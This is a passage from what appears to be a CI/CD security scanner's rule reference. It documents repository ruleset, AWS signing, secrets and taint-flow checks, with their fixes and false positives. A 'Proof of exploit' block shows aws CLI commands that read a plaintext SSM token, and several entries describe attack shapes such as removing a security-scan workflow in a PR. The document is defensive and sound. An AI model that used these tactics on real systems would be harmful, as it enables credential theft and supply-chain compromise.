**Recommendation.** On every active ruleset's ``pull_request`` rule, set ``parameters.dismiss_stale_reviews_on_push: true`` (Settings → Rules → <ruleset> → Require a pull request before merging → Dismiss stale pull request approvals when new commits are pushed). Without it, an attacker can land an approving review on a benign early version of the PR, then force-push (if not blocked by SCM-034) or otherwise update the head with malicious commits, and the original approval still counts toward the required-review gate.

The ruleset analog of SCM-012 (legacy branch-protection stale-review dismissal). Pair with SCM-032 (PR-review presence) — without dismissal, the review-count gate documents intent rather than reality once the PR has diverged from the approved state.

**Known false positives.**

- Some workflows use ephemeral review-bot accounts that auto-re-approve after push; dismissing on push then re-issuing the approval is the documented pattern. The rule still fires (the dismissal happens) and the re-approval lands separately. If your team operates a different review-velocity flow, suppress with a rationale that names the re-approval channel.

**Source:** [`SCM-037`](../providers/scm.md#scm-037) in the [SCM provider](../providers/scm.md).

### `SCM-038`: Active ruleset doesn't require linear history <span class="pg-sev pg-sev--low">LOW</span> { #detail-scm-038 }

**Evidences:** [`ESF-D-CODE-REVIEW`](#ctrl-esf-d-code-review) Require peer review of source and pipeline configuration.

**How this is detected.** For every active ruleset, looks for an entry in the merged ``rules`` array with ``type: "required_linear_history"``. Presence means merge commits to the targeted refs are rejected (only fast-forward / rebase / squash integration is allowed). Passes silently when no rulesets are configured — linear history has no legacy branch-protection analog, so absence of rulesets means the gate simply doesn't exist (not that it's enforced elsewhere).

**Recommendation.** Add a ``required_linear_history`` rule to every active ruleset (Settings → Rules → <ruleset> → Add rule → Require linear history). Without it, merges into the targeted refs can introduce merge commits, which produce a branching history where two ancestors share authorship of the merge result. Linear history forces rebase- or squash-style integration so every commit on the trunk has a single parent and a single attributable author. This pairs with SCM-036 (signed commits) to give post-incident forensics a clean answer to *who wrote this code and when*: each commit on main has one signature, one author, one parent, one timestamp.

Merge commits aren't a direct attacker primitive — force-push (SCM-034) is the history-rewrite surface — but they obscure git-bisect and complicate ``git log --first-parent`` triage during an incident, and they hide which specific commits landed when a long-lived feature branch is merged.

**Known false positives.**

- Teams that prefer merge commits as a deliberate policy (e.g. to preserve the shape of long-lived feature branches in the history) legitimately ship without this rule. Suppress with a rationale that names the merge-strategy policy. The rule is a hygiene / auditability control, not a hard security gate.

**Source:** [`SCM-038`](../providers/scm.md#scm-038) in the [SCM provider](../providers/scm.md).

### `SCM-039`: Active ruleset doesn't pin a required workflow <span class="pg-sev pg-sev--low">LOW</span> { #detail-scm-039 }

**Evidences:** [`ESF-D-CODE-REVIEW`](#ctrl-esf-d-code-review) Require peer review of source and pipeline configuration.

**How this is detected.** For every active ruleset, walks the merged ``rules`` array looking for an entry with ``type: "workflows"`` whose ``parameters.workflows`` is a non-empty list. An empty workflows list is treated as no rule (it documents the gate without filling it). Passes silently when no rulesets are configured — required workflows have no legacy branch-protection analog, so absence of rulesets means the gate simply doesn't exist (not that it's enforced elsewhere).

**Recommendation.** Add a ``workflows`` rule to the ruleset (Settings → Rules → <ruleset> → Add rule → Require workflows to pass before merging) and pin at least one workflow by repository + path + ref. The ``workflows`` ruleset rule differs from ``required_status_checks`` (SCM-033) in a load-bearing way: status checks gate on a context *name* that the workflow chooses to report — if the PR edits the workflow YAML to remove or rename that context, the check vanishes and the gate documents intent rather than reality. The ``workflows`` rule pins the workflow file at a vetted ref (``main`` or a specific SHA) and forces *that* workflow to run against the PR's code regardless of what the PR did to the workflow YAML in its own branch. Closes the scan-removal supply-chain shape (attacker opens a PR that deletes ``.github/workflows/security-scan.yml`` and submits malicious code in the same PR).

Pin the workflow ref to either a long-lived branch the ruleset bypass actors don't have write access to or a specific SHA. A ref pinned to a branch the PR author controls undoes the protection.

**Known false positives.**

- Repos that don't run any workflow-based gating at all (pure code-review + signed-commits posture) legitimately ship without this rule. Suppress with a rationale that names the compensating controls. The rule fires LOW because most teams' security posture comes from status-checks (SCM-033); the workflows rule is the stricter scan-removal-resistant variant.

**Source:** [`SCM-039`](../providers/scm.md#scm-039) in the [SCM provider](../providers/scm.md).

### `SCM-040`: Active ruleset doesn't gate on code scanning results <span class="pg-sev pg-sev--low">LOW</span> { #detail-scm-040 }

**Evidences:** [`ESF-S-VULN-MGMT`](#ctrl-esf-s-vuln-mgmt) Scan inbound artifacts (images, packages) for known vulnerabilities.

**How this is detected.** For every active ruleset, walks the merged ``rules`` array looking for an entry with ``type: "code_scanning"`` whose ``parameters.code_scanning_tools`` lists at least one tool. An empty tools list documents the gate without filling it and is treated as no rule. Passes silently when no rulesets are configured — the rule_type is ruleset-only and has no legacy branch-protection analog, so absence of rulesets means the gate simply doesn't exist (not that it's enforced elsewhere).

**Recommendation.** Add a ``code_scanning`` rule to the ruleset (Settings → Rules → <ruleset> → Add rule → Require code scanning results) and pin at least one tool (CodeQL, the most common choice) with a non-empty alerts threshold. The rule turns a passive code-scanning configuration (SCM-003 — default setup is on) into an active merge gate: the PR can't merge until the scan completes for the head SHA *and* the configured threshold isn't crossed (e.g. ``security_alerts_threshold: "high_or_higher"`` rejects merges that introduce high-severity findings). Closes the asymmetry between code scanning being enabled and the org actually blocking on its results.

If your org doesn't license GHAS (the underlying feature), this rule type isn't available. Suppress with a rationale that names the licensing constraint and carry the gate via ``required_status_checks`` (SCM-033) pointed at the named context the scan tool reports.

**Known false positives.**

- GHAS-licensing constraint: the ``code_scanning`` ruleset rule type requires GitHub Advanced Security on the repo. Repos on free / team tier can't configure this rule even when they run code scanning via third-party tools. Suppress with the licensing rationale and ensure SCM-033 carries the merge gate via the scan tool's reported status-check context.

**Source:** [`SCM-040`](../providers/scm.md#scm-040) in the [SCM provider](../providers/scm.md).

### `SCM-041`: Active ruleset doesn't gate on a deployment environment <span class="pg-sev pg-sev--low">LOW</span> { #detail-scm-041 }

**Evidences:** [`ESF-C-APPROVAL`](#ctrl-esf-c-approval) Require explicit approval before production deployment, [`ESF-C-ENV-SEP`](#ctrl-esf-c-env-sep) Separate deployment environments (dev / staging / prod).

**How this is detected.** For every active ruleset, walks the merged ``rules`` array looking for an entry with ``type: "required_deployments"`` whose ``parameters.required_deployment_environments`` lists at least one environment. Empty lists are treated as no rule. Passes silently when no rulesets are configured — required-deployments enforcement has no legacy branch-protection analog in this scanner's coverage and is not separately evaluated.

**Recommendation.** Add a ``required_deployments`` rule to every active ruleset (Settings → Rules → <ruleset> → Add rule → Require deployments to succeed before merging) and pin at least one environment (typically the staging environment that a CI pipeline deploys the PR's commit to). Pairs with SCM-023 (env reviewers) and SCM-024 (env branch policy): SCM-023/024 ensure the environment itself is gated; SCM-041 makes a successful deployment to that environment a merge prerequisite. Without it, a PR can merge into the default branch without a smoke-test deployment having run, even when the environment is rigorously configured. The ruleset analog of legacy branch protection's ``required_deployments`` checkbox.

An empty environments list (``required_deployment_environments: []``) documents the gate without filling it and is treated as no rule. Pick at least one environment name (typically ``staging`` or ``preview``) so the rule actually gates.

**Known false positives.**

- Repos that don't have GitHub deployment environments configured (or that gate via status-checks SCM-033 pointed at a deploy job's reported context) legitimately ship without this rule. Suppress with a rationale that names the compensating control. The rule fires LOW because most teams' deployment gating comes from the environment configuration itself (SCM-023, SCM-024); SCM-041 is the merge-side complement that closes the gap when an environment exists but isn't named in any ruleset.

**Source:** [`SCM-041`](../providers/scm.md#scm-041) in the [SCM provider](../providers/scm.md).

### `SCM-042`: Active ruleset doesn't require merge queue <span class="pg-sev pg-sev--low">LOW</span> { #detail-scm-042 }

**Evidences:** [`ESF-D-CODE-REVIEW`](#ctrl-esf-d-code-review) Require peer review of source and pipeline configuration.

**How this is detected.** For every active ruleset, looks for an entry in the merged ``rules`` array with ``type: "merge_queue"``. Presence means merges to the targeted refs must enter the queue. Passes silently when no rulesets are configured — merge queue has no legacy branch-protection analog (the feature is ruleset-only).

**Recommendation.** Add a ``merge_queue`` rule to every active ruleset that covers a high-throughput trunk (Settings → Rules → <ruleset> → Add rule → Require merge queue). Without it, two PRs that each pass ``required_status_checks`` (SCM-033) independently can both merge into the same trunk and produce a state where the combined diff wasn't actually validated — a class of integration regressions that CI on the individual PRs can't catch. The merge queue serializes merges and re-runs the configured checks against the queue's post-merge candidate commit before the merge lands, so the trunk always reflects a tested state.

Pair with SCM-033 (required status checks). SCM-033 ensures CI passes BEFORE merge; SCM-042's merge queue ensures CI passes AFTER merge in queue order. The two gates address different failure modes — the queue closes the merge-race surface that per-PR CI can't see.

**Known false positives.**

- Low-throughput repos (one or two PRs landing per day) don't typically hit the merge-race shape this rule addresses; the operational cost of a merge queue can outweigh the benefit. Suppress with a rationale that names the merge-velocity profile. The rule fires LOW because most teams' CI integrity comes from status-checks (SCM-033); merge_queue is the additional concurrency-hardening control.

**Source:** [`SCM-042`](../providers/scm.md#scm-042) in the [SCM provider](../providers/scm.md).

### `SCM-043`: Tag-targeted ruleset doesn't require signed commits <span class="pg-sev pg-sev--medium">MEDIUM</span> { #detail-scm-043 }

**Evidences:** [`ESF-D-TAMPER`](#ctrl-esf-d-tamper) Protect build artifacts from tampering and detect unauthorized modification.

**How this is detected.** Iterates active rulesets where ``target == "tag"`` and fires when none enforce ``required_signatures`` on the tag refs they cover. Passes silently when no tag-targeted rulesets exist at all (a separate gap: there's no tag protection to evaluate).

**Recommendation.** Add a ``required_signatures`` rule to every active ruleset whose ``target == tag`` (Settings → Rules → <ruleset> → Add rule → Require signed commits). Tag objects under a release-like glob (``refs/tags/v*`` or ``refs/tags/**``) are downstream consumers' lookup keys; an unsigned tag means a stolen PAT can stamp a release with arbitrary author metadata while the branch-side signing requirement (SCM-006 / SCM-036) passes.

**Known false positives.**

- Repos that sign tags via a release workflow rather than the ruleset gate (e.g. ``cosign sign`` on the release artifact) get equivalent provenance. Suppress per repo with a rationale that names the workflow.

**Source:** [`SCM-043`](../providers/scm.md#scm-043) in the [SCM provider](../providers/scm.md).

### `SCM-044`: Default-branch signed-commits requirement bypassed for admins <span class="pg-sev pg-sev--medium">MEDIUM</span> { #detail-scm-044 }

**Evidences:** [`ESF-D-TAMPER`](#ctrl-esf-d-tamper) Protect build artifacts from tampering and detect unauthorized modification.

**How this is detected.** Fires when ``required_signatures.enabled == True`` and ``enforce_admins.enabled`` is missing or ``False``. The rule passes silently in two cases: when signed commits aren't required at all (SCM-006 owns that surface) and when branch protection is missing entirely (SCM-001).

**Recommendation.** Enable ``Include administrators`` (``enforce_admins``) on the default-branch protection rule so the signed-commit requirement applies to admins too. Alternatively, migrate the requirement into a repository ruleset where bypass actors are explicit and auditable — admin bypass via the legacy protection knob is implicit, while a ruleset bypass list names each actor and is visible in the audit log (see SCM-030 for the ruleset-side bypass check).

**Known false positives.**

- Solo-maintainer repos where the single admin is also the only signing-key holder may turn off enforce_admins to self-recover from a lost key. Suppress per repo with a rationale that names the recovery workflow.

**Source:** [`SCM-044`](../providers/scm.md#scm-044) in the [SCM provider](../providers/scm.md).

### `SCM-045`: Default code scanning uses the limited query suite <span class="pg-sev pg-sev--low">LOW</span> { #detail-scm-045 }

**Evidences:** [`ESF-S-VULN-MGMT`](#ctrl-esf-s-vuln-mgmt) Scan inbound artifacts (images, packages) for known vulnerabilities.

**How this is detected.** Reads ``query_suite`` from the default code-scanning setup endpoint. Fires only when ``state == configured`` AND ``query_suite == default``. Passes silently when scanning is off (SCM-003 owns that case) or when the suite is already ``extended``.

**Recommendation.** In ``Settings → Code security → Code scanning → Default setup``, switch ``Query suite`` from ``Default`` to ``Extended``. The extended suite adds CodeQL's ``security-and-quality`` pack, which catches maintainability and reliability issues that often co-occur with security findings (e.g. dead-code paths that hide an unauthenticated branch). Teams that ship a hand-authored CodeQL workflow can pin ``queries: security-extended`` in ``.github/codeql/codeql-config.yml`` for the same effect.

**Known false positives.**

- Teams that route code-scanning via a hand-authored CodeQL workflow rather than default setup will see SCM-045 pass by virtue of ``state != configured``; verify the workflow pins the extended suite. Some repos intentionally keep the default suite to bound CI minutes; suppress per repo with a rationale.

**Source:** [`SCM-045`](../providers/scm.md#scm-045) in the [SCM provider](../providers/scm.md).

### `SCM-046`: Default code scanning is configured but paused <span class="pg-sev pg-sev--medium">MEDIUM</span> { #detail-scm-046 }

**Evidences:** [`ESF-S-VULN-MGMT`](#ctrl-esf-s-vuln-mgmt) Scan inbound artifacts (images, packages) for known vulnerabilities.

**How this is detected.** Reads ``schedule`` from the default code-scanning setup endpoint. Fires when ``state == configured`` AND schedule is ``None`` / ``"none"`` / missing. Passes silently when scanning is off entirely (SCM-003) or when a schedule is set.

**Recommendation.** Set ``schedule`` to ``weekly`` (or ``daily`` if CI minutes allow) on the default code-scanning setup, and confirm ``On push`` + ``On pull request`` triggers are enabled in ``Settings → Code security → Code scanning → Default setup → Edit configuration``. Without a schedule or event trigger, the setup record exists but no scan output ever lands; the Code Scanning UI stays empty and SCM-003 passes because ``state == configured``.

**Known false positives.**

- Repos that route scanning via a hand-authored workflow may keep default setup configured but unscheduled intentionally. Suppress per repo with a rationale that names the workflow file.

**Source:** [`SCM-046`](../providers/scm.md#scm-046) in the [SCM provider](../providers/scm.md).

### `SCM-047`: Repo language excluded from default code-scanning coverage <span class="pg-sev pg-sev--medium">MEDIUM</span> { #detail-scm-047 }

**Evidences:** [`ESF-S-VULN-MGMT`](#ctrl-esf-s-vuln-mgmt) Scan inbound artifacts (images, packages) for known vulnerabilities.

**How this is detected.** Cross-references the linguist ``languages`` endpoint against the default-setup ``languages`` slot. Fires when a CodeQL-supported language present at ≥5% of repo bytes is missing from the scanning set. Passes silently when default scanning isn't configured (SCM-003 / SCM-046 own those cases) or when the languages endpoint is unavailable.

**Recommendation.** Open the default code-scanning setup configuration (``Settings → Code security → Code scanning → Default setup → Edit configuration``) and add the missing languages to the analyzed set. If a language isn't CodeQL-supported (e.g. Shell, Lua), set up a third-party SAST workflow that uploads SARIF for that subset — default setup's auto-detect doesn't cover every language.

**Known false positives.**

- Monorepos may intentionally exclude legacy subdirectories from CodeQL analysis (e.g. a vendored fork). Suppress per repo with a rationale that names the excluded path; the default-setup language toggle is repo-wide, so a per-path exclusion requires a hand-authored workflow.

**Source:** [`SCM-047`](../providers/scm.md#scm-047) in the [SCM provider](../providers/scm.md).

### `SIGN-001`: No AWS Signer profile defined for Lambda deploys <span class="pg-sev pg-sev--medium">MEDIUM</span> { #detail-sign-001 }

**Evidences:** [`ESF-D-SIGN-ARTIFACTS`](#ctrl-esf-d-sign-artifacts) Sign build artifacts and verify signatures before release.

**How this is detected.** AWS Signer profiles are the upstream of LMB-001's code-signing config. Without a profile defined, no function in the account can enforce code-signing, LMB-001's recommendation has nothing to point at. The profile is the foundation; the per-function code-signing config attaches it.

**Recommendation.** Create an AWS Signer profile with platform ``AWSLambda-SHA384-ECDSA`` and reference it from every Lambda code-signing config used by the pipeline. Without a profile, LMB-001 remediation isn't possible and release artifacts can't be signed at build time.

**Source:** [`SIGN-001`](../providers/aws.md) in the [AWS provider](../providers/aws.md).

### `SIGN-002`: AWS Signer profile is revoked or inactive <span class="pg-sev pg-sev--high">HIGH</span> { #detail-sign-002 }

**Evidences:** [`ESF-D-SIGN-ARTIFACTS`](#ctrl-esf-d-sign-artifacts) Sign build artifacts and verify signatures before release.

**How this is detected.** A revoked or canceled Signer profile invalidates every signature it ever produced. Lambda functions configured to enforce code-signing fail to deploy until the profile is replaced (or, if ``UntrustedArtifactOnDeployment = Warn``, deploy with a CloudWatch warning the operator rarely reads).

**Recommendation.** Rotate the signing profile: create a replacement and update every code-signing config that references the revoked profile. A revoked or canceled profile invalidates every signature it produced, lambdas relying on it will fail verification.

**Source:** [`SIGN-002`](../providers/aws.md) in the [AWS provider](../providers/aws.md).

### `SM-000`: Secrets Manager API access failed <span class="pg-sev pg-sev--info">INFO</span> { #detail-sm-000 }

**Evidences:** [`ESF-C-AUDIT`](#ctrl-esf-c-audit) Audit deployment / pipeline activity and retain logs.

**How this is detected.** See [`AWS` provider documentation](../providers/aws.md) for the rule's detection mechanism.

**Recommendation.** See [`AWS` provider documentation](../providers/aws.md) for the recommended remediation.

**Source:** [`SM-000`](../providers/aws.md) in the [AWS provider](../providers/aws.md).

### `SM-001`: Secrets Manager secret has no rotation configured <span class="pg-sev pg-sev--high">HIGH</span> { #detail-sm-001 }

**Evidences:** [`ESF-D-TOKEN-HYGIENE`](#ctrl-esf-d-token-hygiene) Use short-lived, federated credentials (OIDC), not long-lived tokens.

**How this is detected.** Only secrets actually referenced by CodeBuild are checked, secrets used purely by application workloads are out of scope for a CI/CD scanner.

**Recommendation.** Enable automatic rotation on every Secrets Manager secret referenced by a CodeBuild project or CodePipeline. Unrotated secrets persist indefinitely, so a single leak (e.g. a build log that echoed the value) compromises the secret for its full lifetime.

**Source:** [`SM-001`](../providers/aws.md) in the [AWS provider](../providers/aws.md).

### `SM-002`: Secrets Manager resource policy allows wildcard principal <span class="pg-sev pg-sev--critical">CRITICAL</span> { #detail-sm-002 }

**Evidences:** [`ESF-C-LEAST-PRIV`](#ctrl-esf-c-least-priv) Apply least-privilege to CI/CD service roles and pipelines.

**How this is detected.** A wildcard-principal Allow on a Secrets Manager resource policy means any principal in any AWS account can call ``GetSecretValue`` (subject to conditions, if any). Always combine with at least ``aws:SourceAccount`` or ``aws:PrincipalOrgID``, the lift-and-shift cross-account secret-access pattern needs scoping.

**Recommendation.** Remove Allow statements whose Principal is ``*`` from every Secrets Manager resource policy, or scope them with a ``Condition`` restricting the source account/org (``aws:PrincipalOrgID``). A wildcard-principal policy allows any AWS account to call ``GetSecretValue`` on the secret.

**Source:** [`SM-002`](../providers/aws.md) in the [AWS provider](../providers/aws.md).

### `SSM-000`: SSM Parameter Store API access failed <span class="pg-sev pg-sev--info">INFO</span> { #detail-ssm-000 }

**Evidences:** [`ESF-C-AUDIT`](#ctrl-esf-c-audit) Audit deployment / pipeline activity and retain logs.

**How this is detected.** See [`AWS` provider documentation](../providers/aws.md) for the rule's detection mechanism.

**Recommendation.** See [`AWS` provider documentation](../providers/aws.md) for the recommended remediation.

**Source:** [`SSM-000`](../providers/aws.md) in the [AWS provider](../providers/aws.md).

### `SSM-001`: SSM Parameter with secret-like name is not a SecureString <span class="pg-sev pg-sev--high">HIGH</span> { #detail-ssm-001 }

**Evidences:** [`ESF-D-SECRETS`](#ctrl-esf-d-secrets) Protect secrets used during build; no secrets in source or env.

**How this is detected.** An SSM ``String`` parameter is plaintext at rest and at API; ``ssm:GetParameter`` without any KMS Decrypt authority returns the value. ``SecureString`` adds KMS-encryption + the ``WithDecryption=true`` flag (which forces an explicit KMS authorization step). Secret-named parameters (``TOKEN``, ``PASSWORD``, ``KEY``) are almost always intended to be SecureString and rarely should not be.

**Recommendation.** Recreate the parameter with ``Type=SecureString`` and migrate consumers to the new name if needed. Plain ``String`` parameters are visible via ``ssm:GetParameter`` without any KMS authorization.

**Proof of exploit.**

```
# Vulnerable: secret-named parameter stored as plain ``String``.
$ aws ssm put-parameter \
    --name /prod/api/GITHUB_TOKEN \
    --value ghp_AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA \
    --type String

# Attack: any principal with the minimal ``ssm:GetParameter``
# permission reads the cleartext, no KMS authorization needed:
#
#   aws ssm get-parameter --name /prod/api/GITHUB_TOKEN
#   # Returns the plaintext, even for principals with
#   # ``kms:Decrypt`` explicitly denied account-wide.
#
# CloudTrail records the GetParameter call but not the value;
# defenders see the access only by name + principal, not what
# was read.

# Safe: SecureString forces a separate KMS authorization step.
$ aws ssm put-parameter \
    --name /prod/api/GITHUB_TOKEN \
    --value ghp_AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA \
    --type SecureString \
    --key-id alias/prod-secrets

# Now readers need BOTH ``ssm:GetParameter`` AND ``kms:Decrypt``
# on the named CMK, and the call only returns plaintext when
# ``WithDecryption=true`` is set (an explicit, auditable opt-in).
```

**Source:** [`SSM-001`](../providers/aws.md) in the [AWS provider](../providers/aws.md).

### `SSM-002`: SSM SecureString uses the default AWS-managed key <span class="pg-sev pg-sev--medium">MEDIUM</span> { #detail-ssm-002 }

**Evidences:** [`ESF-C-ARTIFACT-AUTHZ`](#ctrl-esf-c-artifact-authz) Restrict access to artifact storage and deployment pipelines.

**How this is detected.** ``alias/aws/ssm`` is the AWS-managed default for SecureString. Its key policy is fixed and account-wide. A customer-managed key gives you the same per-parameter key-policy + CloudTrail audit story you'd apply to Secrets Manager (which always uses a CMK).

**Recommendation.** Recreate SecureString parameters with ``KeyId`` pointing at a customer-managed KMS key. The default ``alias/aws/ssm`` key is shared across the account and its key policy cannot be audited or scoped per parameter.

**Source:** [`SSM-002`](../providers/aws.md) in the [AWS provider](../providers/aws.md).

### `TAINT-001`: Untrusted input flows across step boundaries via step outputs <span class="pg-sev pg-sev--high">HIGH</span> { #detail-taint-001 }

**Evidences:** [`ESF-D-INJECTION`](#ctrl-esf-d-injection) Prevent script / template injection from untrusted pipeline context.

**How this is detected.** GHA-003 detects the *direct* interpolation case (``${{ github.event.* }}`` inside a ``run:`` body) and the *single-step* env-inheritance case. TAINT-001 fills the cross-step gap: a producer step sets a tainted step output, and a consumer step (in the same job) interpolates it via ``${{ steps.<id>.outputs.<name> }}``. The producer's interpolation is GHA-003's finding; TAINT-001's finding lives at the consumer (the actual injection sink) and carries the full chain in its description so a reader sees both sides at once.

v1 limitations: only same-job step outputs are tracked; ``jobs.<id>.outputs.*`` (cross-job propagation) and reusable-workflow input/output forwarding are tracked as future work in ``ROADMAP.md``. The producer pass matches the canonical ``echo "name=..." >> $GITHUB_OUTPUT`` shape and the legacy ``::set-output name=...::`` workflow-command form.

**Recommendation.** Sanitise the value at the step that *writes* the ``$GITHUB_OUTPUT`` entry. The canonical pattern is to interpolate the untrusted source into an ``env:`` variable on the producer step and reference the env var in the ``echo``: ``env: TITLE: ${{ github.event.issue.title }}`` then ``echo "title=$TITLE" >> $GITHUB_OUTPUT``. After that, downstream steps reading ``steps.<id>.outputs.title`` see a string-typed value with no GitHub-expression evaluation pass left to exploit. Removing the source entirely is the safest fix; if the value genuinely needs to flow downstream, round-trip it through an env var the way GHA-003 recommends so the shell quoting still applies.

**Known false positives.**

- If the producer step deliberately runs a sanitiser between the interpolation and the ``$GITHUB_OUTPUT`` write (``echo "$TITLE" | tr -dc 'a-zA-Z0-9 ' >> $GITHUB_OUTPUT``), the consumer is no longer exploitable. The rule's regex doesn't model that transformation and will still fire; suppress via ignore-file scoped to the consumer step name when this is the deliberate shape. The producer's GHA-003 finding then carries the residual signal that the sanitiser is load-bearing.

**Source:** [`TAINT-001`](../providers/github.md#taint-001) in the [GitHub Actions provider](../providers/github.md).

### `TAINT-002`: Untrusted input flows across jobs via ``jobs.<id>.outputs:`` <span class="pg-sev pg-sev--high">HIGH</span> { #detail-taint-002 }

**Evidences:** [`ESF-D-INJECTION`](#ctrl-esf-d-injection) Prevent script / template injection from untrusted pipeline context.

**How this is detected.** TAINT-001 catches step-output flow within a single job; TAINT-002 catches the cross-job transition. Engine shape: walk every job's ``outputs:`` mapping looking for values that interpolate either a tainted step output or a direct ``${{ github.event.* }}`` source. Tainted job outputs are matched against every ``${{ needs.<job>.outputs.<name> }}`` reference in any downstream job's ``run:`` / ``with:`` body. Each match emits a TAINT-002 finding with the full chain in the description.

Same-step interpolations (the producer's own use of ``${{ github.event.* }}`` inside its ``run:``) are still GHA-003's responsibility; TAINT-002's value is the cross-job hop the single-step rule can't see.

**Recommendation.** Sanitise the value at the producer step *before* it lands in ``$GITHUB_OUTPUT``. Once the value is in a job output the consuming job has no expression-level escaping pass left, ``${{ needs.<job>.outputs.<name> }}`` substitutes the string verbatim into the consumer's shell. The canonical safe pattern is to copy the untrusted source into the producer step's ``env:`` block, reference the env var quoted in ``echo "name=$VAR" >> $GITHUB_OUTPUT``, and only then surface it through the job output. The consuming job should still treat the value as tainted (use it in env-var form, not interpolated directly into shell).

**Known false positives.**

- Sanitisation between the source interpolation and the $GITHUB_OUTPUT write isn't modeled. If the producer step runs ``echo "$TITLE" | tr -dc 'a-zA-Z0-9 '`` before redirecting to GITHUB_OUTPUT, the consumer is no longer exploitable but TAINT-002 will still fire; suppress via ignore-file scoped to the consumer job's workflow file when this is the deliberate shape.

**Source:** [`TAINT-002`](../providers/github.md#taint-002) in the [GitHub Actions provider](../providers/github.md).

### `TAINT-003`: Untrusted input forwarded into reusable workflow ``with:`` <span class="pg-sev pg-sev--high">HIGH</span> { #detail-taint-003 }

**Evidences:** [`ESF-D-INJECTION`](#ctrl-esf-d-injection) Prevent script / template injection from untrusted pipeline context.

**How this is detected.** Detection walks every ``jobs.<id>.uses: <callee>`` reference, finds every ``with:`` value that interpolates an attacker-controllable source (direct ``${{ github.event.* }}``, a tainted step output via ``${{ steps.<id>.outputs.<name> }}``, or a cross-job ``${{ needs.<job>.outputs.<name> }}``), and flags the forward.

When the callee body is loaded into the same scan (local ``./.github/workflows/<file>.yml`` references via ``--gha-path``, or remote refs fetched by ``--resolve-remote``), the rule also checks whether the callee references ``${{ inputs.<name> }}`` unquoted in a sink. Confirmed end-to-end paths get HIGH confidence; caller-side-only forward stay at MEDIUM (still a risk surface, but a future change to the callee could expose it).

**Recommendation.** Sanitise the value at the caller before forwarding it across the reusable-workflow boundary. The canonical safe pattern is to copy the untrusted source into a step's ``env:`` block, run a sanitiser (``tr -dc 'a-zA-Z0-9 '`` is enough for a freeform title), surface the sanitised result via ``echo "name=$VAR" >> $GITHUB_OUTPUT``, then forward ``${{ steps.<id>.outputs.<name> }}`` as the ``with:`` input. The callee then sees a string-typed value with no expression-evaluation pass left to exploit. If the callee is under your control, also handle the input via env in the callee's ``run:`` body (not direct ``${{ inputs.<name> }}`` interpolation).

**Known false positives.**

- Callees that wrap the input safely (immediately copy into env, sanitise before use) make the caller-side forward harmless. When the callee body is loaded into the scan, the rule downgrades to MEDIUM confidence on those paths; suppress via ignore-file when the callee's handling is audited and sound. Without ``--resolve-remote`` the rule can't see remote callee bodies and every forward stays at MEDIUM, the right default for unverifiable cross-repo flow.

**Source:** [`TAINT-003`](../providers/github.md#taint-003) in the [GitHub Actions provider](../providers/github.md).

### `TAINT-004`: Untrusted input flows across jobs via dotenv artifact <span class="pg-sev pg-sev--high">HIGH</span> { #detail-taint-004 }

**Evidences:** [`ESF-D-INJECTION`](#ctrl-esf-d-injection) Prevent script / template injection from untrusted pipeline context.

**How this is detected.** Detection is a two-pass walk over the pipeline. Pass 1 looks for jobs whose scripts write ``KEY=value`` to a file declared under ``artifacts.reports.dotenv:`` and whose ``value`` interpolates an attacker-controllable GitLab predefined variable (the ``UNTRUSTED_VAR_RE`` vocabulary GL-002 already uses). Pass 2 walks every job with a ``needs:`` / ``dependencies:`` link to a producer and looks for ``$KEY`` references in scripts that match a tainted leak.

v1 limitations: ``extends:`` job-template inheritance and cross-pipeline ``include:`` are not yet tracked. The dotenv path matching is literal (``./taint.env`` and ``taint.env`` are treated as the same path), no glob expansion is performed.

**Recommendation.** Sanitise the value at the producer job before it lands in the dotenv file. The canonical safe pattern is to copy the ``$CI_COMMIT_*`` / ``$CI_MERGE_REQUEST_*`` source into an intermediate shell variable, run a sanitiser (``tr -dc 'a-zA-Z0-9 '`` is enough for a freeform title), and only then write the cleaned value to dotenv. The consuming job should still treat the auto-imported variable as tainted, reference it quoted (``"$TITLE"``) and never inline into a command without re-quoting. Removing the dotenv entirely is the strongest fix; if the value genuinely needs to flow downstream, validate the sanitiser is doing what you think before relying on it.

**Known false positives.**

- If the producer job runs a sanitiser between the tainted source interpolation and the dotenv write (``echo "$CI_COMMIT_TITLE" | tr -dc 'a-zA-Z0-9 ' > taint.env``), the consumer is no longer exploitable but TAINT-004 still fires. Suppress via ignore-file scoped to the consumer job's pipeline file when this is the deliberate shape; the sanitiser is then load-bearing and any future regression in it would re-expose the consumer.

**Source:** [`TAINT-004`](../providers/gitlab.md#taint-004) in the [GitLab CI provider](../providers/gitlab.md).

### `TAINT-005`: Untrusted input flows across steps via ``buildkite-agent meta-data`` <span class="pg-sev pg-sev--high">HIGH</span> { #detail-taint-005 }

**Evidences:** [`ESF-D-INJECTION`](#ctrl-esf-d-injection) Prevent script / template injection from untrusted pipeline context.

**How this is detected.** Detection is a two-pass walk over the pipeline. Pass 1 looks for ``buildkite-agent meta-data set <key> <value>`` invocations whose ``<value>`` interpolates an attacker-controllable Buildkite predefined variable (the same ``BUILDKITE_*`` vocabulary BK-003 uses). Pass 2 walks every step for ``buildkite-agent meta-data get <key>`` invocations and matches against the producer keys recorded in pass 1.

Buildkite meta-data is per-build, not per-step; any step in the same build can read what any earlier step wrote regardless of ``depends_on:``. The detector doesn't model temporal ordering and fires whenever both a tainted set and a get of the same key exist in the same pipeline file. v1 limitations: ``meta-data exists`` (returns 0/1 status) and the ``--default`` form aren't tracked; plugins providing their own meta-data abstraction (e.g. ``cattle-ops/github-merged-pr``) aren't introspected.

**Recommendation.** Sanitise the value at the producer step before it lands in the meta-data store. The canonical safe pattern is to copy the ``$BUILDKITE_PULL_REQUEST_*`` / ``$BUILDKITE_MESSAGE`` / branch / commit / author source into an intermediate shell variable, run a sanitiser (``tr -dc 'a-zA-Z0-9 '`` is enough for a freeform title), and only then call ``buildkite-agent meta-data set``. The consuming step should still reference the ``$(buildkite-agent meta-data get ...)`` value quoted (``"$TITLE"``) and never inline into a command without re-quoting. Removing the meta-data flow entirely is the strongest fix; if the value genuinely needs to flow downstream, validate the sanitiser is doing what you think before relying on it.

**Known false positives.**

- If the producer step runs a sanitiser between the tainted source interpolation and the ``meta-data set`` call (``echo "$BUILDKITE_PULL_REQUEST_TITLE" | tr -dc 'a-zA-Z0-9 ' | xargs -I{} buildkite-agent meta-data set title {}``), the consumer is no longer exploitable but TAINT-005 still fires. Suppress via ignore-file scoped to the consumer step's pipeline file when this is the deliberate shape; the sanitiser is then load-bearing and any future regression in it would re-expose the consumer.

